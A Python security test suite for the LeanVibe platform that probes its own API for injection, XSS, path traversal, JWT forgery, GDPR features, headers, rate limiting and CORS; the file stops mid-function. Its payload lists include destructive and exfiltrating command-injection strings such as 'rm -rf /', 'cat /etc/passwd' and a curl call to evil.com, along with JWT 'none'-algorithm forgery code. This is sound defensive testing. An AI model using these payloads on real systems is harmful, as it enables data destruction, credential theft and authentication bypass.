"""
Comprehensive Security and Compliance Testing for LeanVibe Platform

This test suite validates security measures, compliance requirements,
and data protection across all phases of the platform.

Test Categories:
1. Penetration Testing & Vulnerability Assessment
2. Authentication & Authorization Security
3. GDPR & Privacy Compliance
4. Enterprise Security Features
5. Data Protection & Encryption
6. API Security & Rate Limiting
7. Audit Trail & Compliance Logging
8. OWASP Top 10 Validation
"""

import asyncio
import logging
import time
import json
import uuid
import base64
import hashlib
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from pathlib import Path
import httpx
import jwt as pyjwt

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.models.auth_models import User
from app.models.tenant_models import Tenant
from app.services.auth_service import AuthenticationService
from tests.mocks.integration_mocks import (
    MockEmailService,
    MockRedisClient
)

logger = logging.getLogger(__name__)


@dataclass
class SecurityTestResult:
    """Result of a security test"""
    test_name: str
    success: bool
    severity: str  # "critical", "high", "medium", "low", "info"
    description: str
    vulnerabilities_found: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    compliance_status: Dict[str, bool] = field(default_factory=dict)


@dataclass
class SecurityAssessmentReport:
    """Comprehensive security assessment report"""
    overall_security_score: float
    critical_issues: int
    high_issues: int
    medium_issues: int
    low_issues: int
    test_results: List[SecurityTestResult] = field(default_factory=list)
    compliance_scores: Dict[str, float] = field(default_factory=dict)
    recommendations: List[str] = field(default_factory=list)


class SecurityComplianceValidator:
    """Comprehensive Security and Compliance Validator"""
    
    def __init__(self, test_client: TestClient):
        self.client = test_client
        self.auth_service = AuthenticationService()
        self.mock_email = MockEmailService()
        self.mock_redis = MockRedisClient()
        
        # Security test configuration
        self.base_url = "http://testserver"
        self.test_payloads = self._initialize_test_payloads()
        self.compliance_frameworks = ["GDPR", "SOC2", "ISO27001", "OWASP"]
        
        # Track security findings
        self.security_findings: List[SecurityTestResult] = []
    
    def _initialize_test_payloads(self) -> Dict[str, List[str]]:
        """Initialize security test payloads"""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "admin'--",
                "' OR 1=1#",
                "'; EXEC sp_adduser 'test' --"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src='x' onerror='alert(1)'>",
                "javascript:alert('XSS')",
                "<svg onload=alert(1)>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src='javascript:alert(1)'>"
            ],
            "command_injection": [
                "; ls -la",
                "&& cat /etc/passwd",
                "| whoami",
                "; rm -rf /",
                "&& curl http://evil.com",
                "`cat /etc/hosts`"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc//passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ],
            "nosql_injection": [
                "'; return true; var x = '",
                "{$ne: null}",
                "{$regex: '.*'}",
                "{$where: 'return true'}",
                "'; sleep(5000); var x = '"
            ]
        }
    
    async def penetration_testing_assessment(self) -> SecurityTestResult:
        """
        Comprehensive penetration testing and vulnerability assessment
        
        Tests:
        1. SQL injection across all endpoints
        2. XSS prevention in frontend
        3. Command injection prevention
        4. Path traversal protection
        5. NoSQL injection prevention
        """
        vulnerabilities = []
        recommendations = []
        
        try:
            logger.info("🔒 Starting penetration testing assessment...")
            
            # Test 1: SQL Injection Testing
            logger.info("💉 Testing SQL injection vulnerabilities...")
            sql_vulns = await self._test_sql_injection()
            if sql_vulns:
                vulnerabilities.extend(sql_vulns)
                recommendations.append("Implement parameterized queries and input validation")
            
            # Test 2: XSS Testing
            logger.info("🔥 Testing XSS vulnerabilities...")
            xss_vulns = await self._test_xss_prevention()
            if xss_vulns:
                vulnerabilities.extend(xss_vulns)
                recommendations.append("Implement proper output encoding and CSP headers")
            
            # Test 3: Command Injection Testing
            logger.info("⚡ Testing command injection vulnerabilities...")
            cmd_vulns = await self._test_command_injection()
            if cmd_vulns:
                vulnerabilities.extend(cmd_vulns)
                recommendations.append("Use safe APIs and avoid system command execution")
            
            # Test 4: Path Traversal Testing
            logger.info("📁 Testing path traversal vulnerabilities...")
            path_vulns = await self._test_path_traversal()
            if path_vulns:
                vulnerabilities.extend(path_vulns)
                recommendations.append("Implement strict file path validation and sandboxing")
            
            # Test 5: Authentication Bypass Testing
            logger.info("🔓 Testing authentication bypass vulnerabilities...")
            auth_vulns = await self._test_authentication_bypass()
            if auth_vulns:
                vulnerabilities.extend(auth_vulns)
                recommendations.append("Strengthen authentication mechanisms and session management")
            
            # Determine severity based on vulnerabilities found
            severity = "low"
            if any("SQL injection" in vuln for vuln in vulnerabilities):
                severity = "critical"
            elif any("XSS" in vuln for vuln in vulnerabilities):
                severity = "high"
            elif vulnerabilities:
                severity = "medium"
            
            success = len(vulnerabilities) == 0
            
            return SecurityTestResult(
                test_name="penetration_testing_assessment",
                success=success,
                severity=severity,
                description=f"Penetration testing found {len(vulnerabilities)} vulnerabilities",
                vulnerabilities_found=vulnerabilities,
                recommendations=recommendations
            )
            
        except Exception as e:
            logger.error(f"Penetration testing assessment failed: {e}")
            return SecurityTestResult(
                test_name="penetration_testing_assessment",
                success=False,
                severity="critical",
                description=f"Testing failed: {e}",
                vulnerabilities_found=["Test execution failure"],
                recommendations=["Fix test infrastructure and retry"]
            )
    
    async def _test_sql_injection(self) -> List[str]:
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Test endpoints that might be vulnerable
        test_endpoints = [
            ("POST", "/auth/login", {"email": "", "password": ""}),
            ("POST", "/auth/register", {"email": "", "password": "", "full_name": "", "company_name": ""}),
            ("GET", "/api/user/profile", {}),
            ("GET", "/api/mvp-projects", {}),
            ("POST", "/api/mvp-projects", {"name": "", "description": ""})
        ]
        
        for method, endpoint, base_data in test_endpoints:
            for payload in self.test_payloads["sql_injection"]:
                try:
                    # Test injection in different parameter positions
                    if method == "POST":
                        # Test in each field
                        for field in base_data.keys():
                            test_data = base_data.copy()
                            test_data[field] = payload
                            
                            response = self.client.post(endpoint, json=test_data)
                            
                            # Check for SQL error indicators
                            if self._detect_sql_error(response):
                                vulnerabilities.append(f"SQL injection vulnerability in {endpoint} field {field}")
                    
                    elif method == "GET":
                        # Test in query parameters
                        response = self.client.get(f"{endpoint}?search={payload}")
                        if self._detect_sql_error(response):
                            vulnerabilities.append(f"SQL injection vulnerability in {endpoint} query parameter")
                
                except Exception as e:
                    # Unexpected errors might indicate vulnerabilities
                    if "database" in str(e).lower() or "sql" in str(e).lower():
                        vulnerabilities.append(f"Potential SQL injection in {endpoint}: {e}")
        
        return vulnerabilities
    
    def _detect_sql_error(self, response) -> bool:
        """Detect SQL error indicators in response"""
        error_indicators = [
            "sql syntax",
            "mysql error",
            "postgresql error",
            "sqlite error",
            "database error",
            "sqlalchemy.exc",
            "constraint violation",
            "invalid column name"
        ]
        
        response_text = response.text.lower() if hasattr(response, 'text') else str(response).lower()
        return any(indicator in response_text for indicator in error_indicators)
    
    async def _test_xss_prevention(self) -> List[str]:
        """Test for XSS vulnerabilities"""
        vulnerabilities = []
        
        # Test XSS in form inputs
        for payload in self.test_payloads["xss"]:
            try:
                # Test registration form
                xss_data = {
                    "email": f"test_{uuid.uuid4().hex[:8]}@example.com",
                    "password": "SecureTest123!",
                    "full_name": payload,  # XSS in name field
                    "company_name": "Test Company"
                }
                
                response = self.client.post("/auth/register", json=xss_data)
                
                # Check if payload is reflected without encoding
                if payload in response.text and not self._is_properly_encoded(payload, response.text):
                    vulnerabilities.append(f"XSS vulnerability in registration form: {payload}")
                
                # Test project creation
                project_data = {
                    "name": payload,  # XSS in project name
                    "description": "Test project description"
                }
                
                # This would need authentication, so we expect it to fail
                # but we're checking for XSS reflection
                project_response = self.client.post("/api/mvp-projects", json=project_data)
                
                if payload in project_response.text and not self._is_properly_encoded(payload, project_response.text):
                    vulnerabilities.append(f"XSS vulnerability in project creation: {payload}")
            
            except Exception as e:
                logger.debug(f"XSS test exception (may be expected): {e}")
        
        return vulnerabilities
    
    def _is_properly_encoded(self, payload: str, response_text: str) -> bool:
        """Check if XSS payload is properly encoded in response"""
        # Check if dangerous characters are encoded
        dangerous_chars = ['<', '>', '"', "'", '&']
        encoded_chars = ['&lt;', '&gt;', '&quot;', '&#x27;', '&amp;']
        
        for char, encoded in zip(dangerous_chars, encoded_chars):
            if char in payload and char in response_text:
                # If the raw character appears, it might not be encoded
                return False
        
        return True
    
    async def _test_command_injection(self) -> List[str]:
        """Test for command injection vulnerabilities"""
        vulnerabilities = []
        
        # Test command injection in file operations or system calls
        for payload in self.test_payloads["command_injection"]:
            try:
                # Test in file upload endpoints (if any)
                test_data = {
                    "filename": f"test{payload}.txt",
                    "content": "test content"
                }
                
                # Most endpoints won't accept arbitrary filenames, but we're testing
                response = self.client.post("/api/files/upload", json=test_data)
                
                # Check for command execution indicators
                if self._detect_command_execution(response):
                    vulnerabilities.append(f"Command injection vulnerability: {payload}")
            
            except Exception as e:
                # Look for signs of command execution in errors
                if any(indicator in str(e).lower() for indicator in ['permission denied', 'command not found', 'no such file']):
                    vulnerabilities.append(f"Potential command injection: {payload}")
        
        return vulnerabilities
    
    def _detect_command_execution(self, response) -> bool:
        """Detect command execution indicators"""
        execution_indicators = [
            "permission denied",
            "command not found",
            "no such file or directory",
            "/bin/",
            "/usr/bin/",
            "root:",
            "uid=",
            "gid="
        ]
        
        response_text = response.text.lower() if hasattr(response, 'text') else str(response).lower()
        return any(indicator in response_text for indicator in execution_indicators)
    
    async def _test_path_traversal(self) -> List[str]:
        """Test for path traversal vulnerabilities"""
        vulnerabilities = []
        
        for payload in self.test_payloads["path_traversal"]:
            try:
                # Test file access endpoints
                file_endpoints = [
                    f"/api/files/{payload}",
                    f"/api/download/{payload}",
                    f"/static/{payload}",
                    f"/assets/{payload}"
                ]
                
                for endpoint in file_endpoints:
                    response = self.client.get(endpoint)
                    
                    # Check for signs of successful traversal
                    if self._detect_path_traversal_success(response):
                        vulnerabilities.append(f"Path traversal vulnerability in {endpoint}")
            
            except Exception as e:
                # Some path traversal attempts might cause exceptions
                if "no such file" not in str(e).lower():
                    vulnerabilities.append(f"Potential path traversal: {payload}")
        
        return vulnerabilities
    
    def _detect_path_traversal_success(self, response) -> bool:
        """Detect successful path traversal"""
        success_indicators = [
            "root:x:",  # /etc/passwd content
            "[boot loader]",  # Windows boot.ini
            "localhost",  # /etc/hosts
            "# Host Database"  # macOS /etc/hosts
        ]
        
        response_text = response.text if hasattr(response, 'text') else str(response)
        return any(indicator in response_text for indicator in success_indicators)
    
    async def _test_authentication_bypass(self) -> List[str]:
        """Test for authentication bypass vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test 1: JWT Token Manipulation
            jwt_vulns = await self._test_jwt_vulnerabilities()
            vulnerabilities.extend(jwt_vulns)
            
            # Test 2: Session Fixation
            session_vulns = await self._test_session_vulnerabilities()
            vulnerabilities.extend(session_vulns)
            
            # Test 3: Privilege Escalation
            privilege_vulns = await self._test_privilege_escalation()
            vulnerabilities.extend(privilege_vulns)
            
        except Exception as e:
            vulnerabilities.append(f"Authentication bypass testing failed: {e}")
        
        return vulnerabilities
    
    async def _test_jwt_vulnerabilities(self) -> List[str]:
        """Test JWT token vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Create a legitimate user and token
            user_data = {
                "email": f"jwt_test_{uuid.uuid4().hex[:8]}@example.com",
                "password": "SecureTest123!",
                "full_name": "JWT Test User",
                "company_name": "JWT Test Company"
            }
            
            register_response = self.client.post("/auth/register", json=user_data)
            if register_response.status_code in [200, 201]:
                login_response = self.client.post("/auth/login", json={
                    "email": user_data["email"],
                    "password": user_data["password"]
                })
                
                if login_response.status_code == 200:
                    token = login_response.json().get("access_token")
                    
                    if token:
                        # Test 1: None algorithm attack
                        none_token = await self._create_none_algorithm_token(token)
                        if await self._test_token_acceptance(none_token):
                            vulnerabilities.append("JWT accepts 'none' algorithm - critical vulnerability")
                        
                        # Test 2: Secret key brute force
                        weak_secret_token = await self._create_weak_secret_token(token)
                        if await self._test_token_acceptance(weak_secret_token):
                            vulnerabilities.append("JWT uses weak secret key")
                        
                        # Test 3: Algorithm confusion
                        rs256_token = await self._create_algorithm_confusion_token(token)
                        if await self._test_token_acceptance(rs256_token):
                            vulnerabilities.append("JWT vulnerable to algorithm confusion attack")
        
        except Exception as e:
            logger.debug(f"JWT testing exception: {e}")
        
        return vulnerabilities
    
    async def _create_none_algorithm_token(self, original_token: str) -> str:
        """Create a token with 'none' algorithm"""
        try:
            # Decode without verification to get payload
            payload = pyjwt.decode(original_token, options={"verify_signature": False})
            
            # Create new token with 'none' algorithm
            header = {"alg": "none", "typ": "JWT"}
            
            # Encode without signature
            encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            return f"{encoded_header}.{encoded_payload}."
        
        except Exception:
            return "invalid_none_token"
    
    async def _create_weak_secret_token(self, original_token: str) -> str:
        """Create a token with a weak secret"""
        try:
            payload = pyjwt.decode(original_token, options={"verify_signature": False})
            
            # Try common weak secrets
            weak_secrets = ["secret", "123456", "password", "key", "jwt_secret"]
            
            for secret in weak_secrets:
                try:
                    token = pyjwt.encode(payload, secret, algorithm="HS256")
                    return token
                except Exception:
                    continue
            
            return "invalid_weak_token"
        
        except Exception:
            return "invalid_weak_token"
    
    async def _create_algorithm_confusion_token(self, original_token: str) -> str:
        """Create a token with algorithm confusion"""
        try:
            payload = pyjwt.decode(original_token, options={"verify_signature": False})
            
            # Try to create RS256 token (algorithm confusion)
            # This is a simplified test - real attack would use public key
            return pyjwt.encode(payload, "fake_private_key", algorithm="RS256")
        
        except Exception:
            return "invalid_rs256_token"
    
    async def _test_token_acceptance(self, token: str) -> bool:
        """Test if a token is accepted by the API"""
        try:
            headers = {"Authorization": f"Bearer {token}"}
            response = self.client.get("/api/user/profile", headers=headers)
            
            # If we get a 200 response, the token was accepted
            return response.status_code == 200
        
        except Exception:
            return False
    
    async def _test_session_vulnerabilities(self) -> List[str]:
        """Test session management vulnerabilities"""
        vulnerabilities = []
        
        # Test session fixation, hijacking, etc.
        # This is a placeholder for actual session testing
        
        return vulnerabilities
    
    async def _test_privilege_escalation(self) -> List[str]:
        """Test privilege escalation vulnerabilities"""
        vulnerabilities = []
        
        # Test vertical and horizontal privilege escalation
        # This is a placeholder for actual privilege testing
        
        return vulnerabilities
    
    async def gdpr_privacy_compliance_test(self) -> SecurityTestResult:
        """
        Test GDPR and privacy compliance features
        
        Compliance Tests:
        1. Data export functionality
        2. Data deletion capabilities
        3. Consent management
        4. Audit trail completeness
        5. Data anonymization features
        """
        compliance_checks = {}
        recommendations = []
        
        try:
            logger.info("🛡️ Testing GDPR and privacy compliance...")
            
            # Create test user for GDPR testing
            test_email = f"gdpr_test_{uuid.uuid4().hex[:8]}@example.com"
            user_data = {
                "email": test_email,
                "password": "SecureTest123!",
                "full_name": "GDPR Test User",
                "company_name": "GDPR Test Company"
            }
            
            register_response = self.client.post("/auth/register", json=user_data)
            if register_response.status_code not in [200, 201]:
                raise Exception("Failed to create test user for GDPR testing")
            
            # Login to get token
            login_response = self.client.post("/auth/login", json={
                "email": test_email,
                "password": user_data["password"]
            })
            
            if login_response.status_code != 200:
                raise Exception("Failed to login test user for GDPR testing")
            
            token = login_response.json().get("access_token")
            headers = {"Authorization": f"Bearer {token}"}
            
            # Test 1: Data Export (GDPR Article 20 - Right to Data Portability)
            logger.info("📦 Testing data export functionality...")
            export_response = self.client.get("/api/user/export-data", headers=headers)
            compliance_checks["data_export"] = export_response.status_code == 200
            
            if not compliance_checks["data_export"]:
                recommendations.append("Implement user data export functionality for GDPR compliance")
            
            # Test 2: Data Deletion (GDPR Article 17 - Right to Erasure)
            logger.info("🗑️ Testing data deletion capabilities...")
            deletion_response = self.client.delete("/api/user/delete-account", headers=headers)
            compliance_checks["data_deletion"] = deletion_response.status_code in [200, 204]
            
            if not compliance_checks["data_deletion"]:
                recommendations.append("Implement user data deletion functionality for GDPR compliance")
            
            # Test 3: Consent Management (GDPR Article 7)
            logger.info("✅ Testing consent management...")
            consent_response = self.client.get("/api/user/consent", headers=headers)
            compliance_checks["consent_management"] = consent_response.status_code == 200
            
            if not compliance_checks["consent_management"]:
                recommendations.append("Implement consent management system for GDPR compliance")
            
            # Test 4: Data Access (GDPR Article 15 - Right of Access)
            logger.info("👁️ Testing data access rights...")
            access_response = self.client.get("/api/user/data-access", headers=headers)
            compliance_checks["data_access"] = access_response.status_code == 200
            
            if not compliance_checks["data_access"]:
                recommendations.append("Implement data access endpoint for GDPR compliance")
            
            # Test 5: Audit Trail
            logger.info("📋 Testing audit trail completeness...")
            audit_response = self.client.get("/api/audit/user-actions", headers=headers)
            compliance_checks["audit_trail"] = audit_response.status_code == 200
            
            if not compliance_checks["audit_trail"]:
                recommendations.append("Implement comprehensive audit trail for compliance")
            
            # Test 6: Data Anonymization
            logger.info("🎭 Testing data anonymization...")
            anonymization_response = self.client.post("/api/user/anonymize", headers=headers)
            compliance_checks["data_anonymization"] = anonymization_response.status_code in [200, 204]
            
            if not compliance_checks["data_anonymization"]:
                recommendations.append("Implement data anonymization features")
            
            # Calculate compliance score
            compliance_score = sum(compliance_checks.values()) / len(compliance_checks)
            
            # Determine severity
            if compliance_score >= 0.9:
                severity = "low"
            elif compliance_score >= 0.7:
                severity = "medium"
            elif compliance_score >= 0.5:
                severity = "high"
            else:
                severity = "critical"
            
            success = compliance_score >= 0.8  # 80% compliance required
            
            return SecurityTestResult(
                test_name="gdpr_privacy_compliance",
                success=success,
                severity=severity,
                description=f"GDPR compliance score: {compliance_score:.1%}",
                vulnerabilities_found=[] if success else [f"GDPR compliance gaps: {compliance_checks}"],
                recommendations=recommendations,
                compliance_status=compliance_checks
            )
            
        except Exception as e:
            logger.error(f"GDPR compliance testing failed: {e}")
            return SecurityTestResult(
                test_name="gdpr_privacy_compliance",
                success=False,
                severity="critical",
                description=f"GDPR testing failed: {e}",
                vulnerabilities_found=["GDPR compliance testing failure"],
                recommendations=["Fix GDPR testing infrastructure and implement required features"]
            )
    
    async def enterprise_security_features_test(self) -> SecurityTestResult:
        """
        Test enterprise-grade security features
        
        Enterprise Security Tests:
        1. SSO integration validation
        2. Multi-factor authentication
        3. Role-based access control
        4. Session management
        5. Audit logging
        6. Password policies
        """
        security_features = {}
        recommendations = []
        
        try:
            logger.info("🏢 Testing enterprise security features...")
            
            # Test 1: SSO Configuration
            logger.info("🔐 Testing SSO configuration...")
            sso_response = self.client.get("/auth/sso/config")
            security_features["sso_available"] = sso_response.status_code == 200
            
            if not security_features["sso_available"]:
                recommendations.append("Implement SSO integration for enterprise customers")
            
            # Test 2: MFA Setup
            logger.info("📱 Testing MFA capabilities...")
            mfa_response = self.client.get("/auth/mfa/setup")
            security_features["mfa_available"] = mfa_response.status_code in [200, 401]  # 401 is expected without auth
            
            if not security_features["mfa_available"]:
                recommendations.append("Implement multi-factor authentication")
            
            # Test 3: RBAC System
            logger.info("👥 Testing role-based access control...")
            rbac_response = self.client.get("/auth/roles")
            security_features["rbac_available"] = rbac_response.status_code in [200, 401]
            
            if not security_features["rbac_available"]:
                recommendations.append("Implement role-based access control system")
            
            # Test 4: Session Management
            logger.info("⏰ Testing session management...")
            session_response = self.client.get("/auth/sessions")
            security_features["session_management"] = session_response.status_code in [200, 401]
            
            if not security_features["session_management"]:
                recommendations.append("Implement comprehensive session management")
            
            # Test 5: Audit Logging
            logger.info("📊 Testing audit logging...")
            audit_response = self.client.get("/api/audit/logs")
            security_features["audit_logging"] = audit_response.status_code in [200, 401, 403]
            
            if not security_features["audit_logging"]:
                recommendations.append("Implement comprehensive audit logging")
            
            # Test 6: Password Policies
            logger.info("🔒 Testing password policies...")
            policy_response = self.client.get("/auth/password-policy")
            security_features["password_policies"] = policy_response.status_code == 200
            
            if not security_features["password_policies"]:
                recommendations.append("Implement configurable password policies")
            
            # Test 7: Security Headers
            logger.info("🛡️ Testing security headers...")
            headers_response = self.client.get("/")
            security_headers = self._check_security_headers(headers_response)
            security_features["security_headers"] = security_headers["score"] >= 0.7
            
            if not security_features["security_headers"]:
                recommendations.extend(security_headers["recommendations"])
            
            # Calculate enterprise security score
            enterprise_score = sum(security_features.values()) / len(security_features)
            
            # Determine severity
            if enterprise_score >= 0.9:
                severity = "low"
            elif enterprise_score >= 0.7:
                severity = "medium"
            else:
                severity = "high"
            
            success = enterprise_score >= 0.8
            
            return SecurityTestResult(
                test_name="enterprise_security_features",
                success=success,
                severity=severity,
                description=f"Enterprise security score: {enterprise_score:.1%}",
                vulnerabilities_found=[] if success else [f"Missing enterprise features: {security_features}"],
                recommendations=recommendations,
                compliance_status=security_features
            )
            
        except Exception as e:
            logger.error(f"Enterprise security testing failed: {e}")
            return SecurityTestResult(
                test_name="enterprise_security_features",
                success=False,
                severity="critical",
                description=f"Enterprise security testing failed: {e}",
                vulnerabilities_found=["Enterprise security testing failure"],
                recommendations=["Implement enterprise security features"]
            )
    
    def _check_security_headers(self, response) -> Dict[str, Any]:
        """Check for security headers in response"""
        headers = response.headers
        
        security_headers_check = {
            "x-content-type-options": headers.get("x-content-type-options") == "nosniff",
            "x-frame-options": headers.get("x-frame-options") is not None,
            "x-xss-protection": headers.get("x-xss-protection") is not None,
            "strict-transport-security": headers.get("strict-transport-security") is not None,
            "content-security-policy": headers.get("content-security-policy") is not None,
            "referrer-policy": headers.get("referrer-policy") is not None
        }
        
        score = sum(security_headers_check.values()) / len(security_headers_check)
        
        recommendations = []
        for header, present in security_headers_check.items():
            if not present:
                recommendations.append(f"Add {header} security header")
        
        return {
            "score": score,
            "headers": security_headers_check,
            "recommendations": recommendations
        }
    
    async def api_security_rate_limiting_test(self) -> SecurityTestResult:
        """
        Test API security and rate limiting
        
        API Security Tests:
        1. Rate limiting effectiveness
        2. API authentication requirements
        3. Input validation and sanitization
        4. Response information disclosure
        5. CORS configuration
        """
        api_security_checks = {}
        recommendations = []
        
        try:
            logger.info("🌐 Testing API security and rate limiting...")
            
            # Test 1: Rate Limiting
            logger.info("🚦 Testing rate limiting...")
            rate_limit_result = await self._test_rate_limiting()
            api_security_checks["rate_limiting"] = rate_limit_result["effective"]
            
            if not rate_limit_result["effective"]:
                recommendations.append("Implement rate limiting to prevent abuse")
            
            # Test 2: API Authentication
            logger.info("🔑 Testing API authentication requirements...")
            auth_result = await self._test_api_authentication()
            api_security_checks["api_authentication"] = auth_result["secure"]
            
            if not auth_result["secure"]:
                recommendations.extend(auth_result["recommendations"])
            
            # Test 3: Input Validation
            logger.info("✅ Testing input validation...")
            input_validation = await self._test_input_validation()
            api_security_checks["input_validation"] = input_validation["adequate"]
            
            if not input_validation["adequate"]:
                recommendations.extend(input_validation["recommendations"])
            
            # Test 4: Information Disclosure
            logger.info("🔍 Testing information disclosure...")
            disclosure_result = await self._test_information_disclosure()
            api_security_checks["no_info_disclosure"] = not disclosure_result["has_disclosure"]
            
            if disclosure_result["has_disclosure"]:
                recommendations.extend(disclosure_result["recommendations"])
            
            # Test 5: CORS Configuration
            logger.info("🌍 Testing CORS configuration...")
            cors_result = await self._test_cors_configuration()
            api_security_checks["cors_secure"] = cors_result["secure"]
            
            if not cors_result["secure"]:
                recommendations.extend(cors_result["recommendations"])
            
            # Calculate API security score
            api_score = sum(api_security_checks.values()) / len(api_security_checks)
            
            # Determine severity
            if api_score >= 0.9:
                severity = "low"
            elif api_score >= 0.7:
                severity = "medium"
            else:
                severity = "high"
            
            success = api_score >= 0.8
            
            return SecurityTestResult(
                test_name="api_security_rate_limiting",
                success=success,
                severity=severity,
                description=f"API security score: {api_score:.1%}",
                vulnerabilities_found=[] if success else [f"API security gaps: {api_security_checks}"],
                recommendations=recommendations,
                compliance_status=api_security_checks
            )
            
        except Exception as e:
            logger.error(f"API security testing failed: {e}")
            return SecurityTestResult(
                test_name="api_security_rate_limiting",
                success=False,
                severity="critical",
                description=f"API security testing failed: {e}",
                vulnerabilities_found=["API security testing failure"],
                recommendations=["Implement comprehensive API security measures"]
            )
    
    async def _test_rate_limiting(self) -> Dict[str, Any]:
        """Test rate limiting effectiveness"""
        try:
            # Make rapid requests to test rate limiting
            rapid_requests = []
            
            for i in range(100):  # Try 100 rapid requests
                start_time = time.time()
                response = self.client.get("/health")
                response_time = time.time() - start_time
                
                rapid_requests.append({
                    "status_code": response.status_code,
                    "response_time": response_time,
                    "request_number": i
                })
                
                # If we get rate limited, break
                if response.status_code == 429:
                    break
            
            # Check if rate limiting kicked in
            rate_limited = any(req["status_code"] == 429 for req in rapid_requests)
            
            return {
                "effective": rate_limited,
                "requests_made": len(rapid_requests),
                "rate_limited_at": next((i for i, req in enumerate(rapid_requests) if req["status_code"] == 429), None)
            }
        
        except Exception as e:
            return {
                "effective": False,
                "error": str(e)
            }
    
    async def _test_api_authentication(self) -> Dict[str, Any]:
        """Test API authentication requirements"""
        unauthenticated_endpoints = []
        recommendations = []
        
        # Test protected endpoints without authentication
        protected_endpoints = [
            "/api/user/profile",
            "/api/mvp-projects",
            "/api/pipelines",
            "/api/tasks",
            "/api/audit/logs"
        ]
        
        for endpoint in protected_endpoints:
            try:
                response = self.client.get(endpoint)
                
                # Should return 401 Unauthorized
                if response.status_code != 401:
                    unauthenticated_endpoints.append(endpoint)
            
            except Exception:
                # Exceptions are acceptable for protected endpoints
                pass
        
        secure = len(unauthenticated_endpoints) == 0
        
        if not secure:
            recommendations.append(f"Secure unauthenticated endpoints: {unauthenticated_endpoints}")
        
        return {
            "secure": secure,
            "unauthenticated_endpoints": unauthenticated_endpoints,
            "recommendations": recommendations
        }
    
    async def _test_input_validation(self) -> Dict[str, Any]:
        """Test input validation and sanitization"""
        validation_failures = []
        recommendations = []
        
        # Test various invalid inputs
        invalid_inputs = [
            {"email": "invalid-email", "field": "email format"},
            {"password": "123", "field": "password strength"},
            {"full_name": "A" * 1000, "field": "name length"},
            {"company_name": "", "field": "required field"}
        ]
        
        for invalid_input in invalid_inputs:
            try:
                test_data = {
                    "email": invalid_input.get("email", "test@example.com"),
                    "password": invalid_input.get("password", "SecureTest123!"),
                    "full_name": invalid_input.get("full_name", "Test User"),
                    "company_name": invalid_input.get("company_name", "Test Company")
                }
                
                response = self.client.post("/auth/register", json=test_data)
                
                # Should return 400 Bad Request for invalid input
                if response.status_code != 400:
                    validation_failures.append(invalid_input["field"])
            
            except Exception:
                # Exceptions might indicate validation is working
                pass
        
        adequate = len(validation_failures) == 0
        
        if not adequate:
            recommendations.append(f"Improve input validation for: {validation_failures}")
        
        return {
            "adequate": adequate,
            "validation_failures": validation_failures,
            "recommendations": recommendations
        }
    
    async def _test_information_disclosure(self) -> Dict[str, Any]:
        """Test for information disclosure vulnerabilities"""
        disclosure_issues = []
        recommendations = []
        
        # Test error message disclosure
        try:
            # Test with malformed JSON
            response = self.client.post("/auth/login", data="invalid json")
            
            if "traceback" in response.text.lower() or "stack trace" in response.text.lower():
                disclosure_issues.append("Server stack traces exposed in errors")
        
        except Exception:
            pass
        
        # Test directory traversal in static files
        try:
            response = self.client.get("/static/../config/settings.py")
            
            if response.status_code == 200 and "secret" in response.text.lower():
                disclosure_issues.append("Configuration files accessible via static route")
        
        except Exception:
            pass
        
        has_disclosure = len(disclosure_issues) > 0
        
        if has_disclosure:
            recommendations.append("Remove sensitive information from error messages")
            recommendations.append("Implement proper error handling to prevent information disclosure")
        
        return {
            "has_disclosure": has_disclosure,
            "disclosure_issues": disclosure_issues,
            "recommendations": recommendations
        }
    
    async def _test_cors_configuration(self) -> Dict[str, Any]:
        """Test CORS configuration security"""
        cors_issues = []
        recommendations = []
        
        try:
            # Test CORS headers
            response = self.client.options("/api/user/profile", headers={
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "GET"
            })
            
            cors_headers = {
                "access-control-allow-origin": response.headers.get("access-control-allow-origin"),
                "access-control-allow-credentials": response.headers.get("access-control-allow-credentials"),
                "access-control-allow-methods": response.headers.get("access-control-allow-methods")
            }
            
            # Check for overly permissive CORS
            if cors_headers["access-control-allow-origin"] == "*":
                cors_issues.append("CORS allows all origins")
                recommendations.append("Restrict CORS to specific allowed origins")
            
            if cors_headers["access-control-allow-credentials"] == "true" and cors_headers["access-control-allow-origin"] == "*":
                cors_issues.append("CORS allows credentials with wildcard origin")
                recommendations.append("Never allow credentials with wildcard CORS origin")
        
        except Exception:
            # No CORS headers might be acceptable for some APIs
            pass
        
        secure = len(cors_issues) == 0
        
        return {
            "secure": secure,
            "cors_issues": cors_issues,
            "recommendations": recommendations
        }
    
    async def generate_security_assessment_report(self) -> SecurityAssessmentReport:
        """Generate comprehensive security assessment report"""
        logger.info("📊 Generating comprehensive security assessment report...")
        
        # Run all security tests
        test_results = []
        
        # Penetration Testing
        pen_test_result = await self.penetration_testing_assessment()
        test_results.append(pen_test_result)
        
        # GDPR Compliance
        gdpr_result = await self.gdpr_privacy_compliance_test()
        test_results.append(gdpr_result)
        
        # Enterprise Security
        enterprise_result = await self.enterprise_security_features_test()
        test_results.append(enterprise_result)
        
        # API Security
        api_result = await self.api_security_rate_limiting_test()
        test_results.append(api_result)
        
        # Calculate overall scores
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        for result in test_results:
            severity_counts[result.severity] += 1
        
        # Calculate overall security score
        severity_weights = {"critical": 0, "high": 0.3, "medium": 0.6, "low": 0.9}
        total_tests = len(test_results)
        
        if total_tests > 0:
            weighted_score = sum(
                severity_weights[result.severity] for result in test_results
            ) / total_tests
            overall_security_score = weighted_score * 100
        else:
            overall_security_score = 0
        
        # Calculate compliance scores
        compliance_scores = {}
